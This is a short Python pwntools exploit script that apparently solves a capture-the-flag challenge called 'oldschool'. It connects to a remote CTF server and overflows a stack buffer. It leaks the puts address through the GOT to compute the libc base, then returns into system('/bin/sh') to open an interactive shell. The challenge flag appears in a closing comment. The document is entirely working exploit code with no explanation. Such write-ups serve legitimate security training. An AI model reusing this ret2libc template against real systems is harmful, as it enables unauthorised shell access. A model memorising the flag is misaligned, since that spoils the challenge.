from pwn import *

context.log_level = 'debug'
e = ELF('./oldschool')
# p = process('./oldschool')
p = remote('bisc.lordofpwn.kr',1473)
# libc = e.libc
libc = ELF('./libc6_2.27-3ubuntu1.3_i386.so')

pay = 'A'*0x38 + 'B'*4 + p32(e.plt['puts']) + p32(0x0804838d) + p32(e.got['puts']) + p32(e.symbols['main'])
p.sendafter('Hello BoB',pay)

l = u32(p.recvuntil('\xf7')[-4:])
log.info(hex(l))

libc_base = l - libc.symbols['puts']
log.info(hex(libc_base))

pay = 'A'*0x38 + 'B'*4 + p32(libc_base + libc.symbols['system']) + p32(0x0804838d) + p32(libc_base + libc.search('/bin/sh\x00').next())
p.sendafter('Hello BoB',pay)

p.interactive()

# bisc{This_is_simple_0ldschool_pwn!!}
